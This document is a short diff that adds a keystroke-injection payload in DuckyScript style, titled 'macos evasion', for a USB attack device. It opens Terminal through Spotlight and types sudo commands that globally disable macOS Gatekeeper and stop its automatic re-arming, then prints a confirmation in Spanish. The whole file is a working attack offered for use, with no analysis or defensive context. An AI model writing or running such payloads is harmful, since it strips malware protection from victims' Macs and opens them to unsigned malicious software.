@@ -1,0 +1,9 @@
+META macos evasion
+DELAY 1000
+GUI SPACE
+DELAY 700
+STRING terminal
+ENTER
+DELAY 1200
+STRING sudo spctl --global-disable && sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO && echo "Gatekeeper desactivado"
+ENTER
